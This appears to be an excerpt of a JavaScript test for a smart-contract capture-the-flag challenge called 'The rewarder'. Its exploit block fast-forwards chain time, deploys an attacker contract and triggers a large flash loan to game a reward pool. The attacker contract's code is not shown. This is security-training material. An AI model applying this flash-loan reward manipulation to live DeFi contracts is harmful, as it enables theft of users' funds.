...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const attackerContractFactory = await ethers.getContractFactory("TheRewarderAttacker");
        const attackerContract = await attackerContractFactory.deploy(this.flashLoanPool.address, 
            this.rewarderPool.address,
            this.rewardToken.address,
            this.liquidityToken.address)
            .then(v => v.connect(attacker));
        const tx = await attackerContract.executeFlashLoan(ethers.utils.parseEther('999999'));
        await tx.wait();
    });
    ...
    after(async function () {
        ...
        //console.log("attacker reward :",rewards);
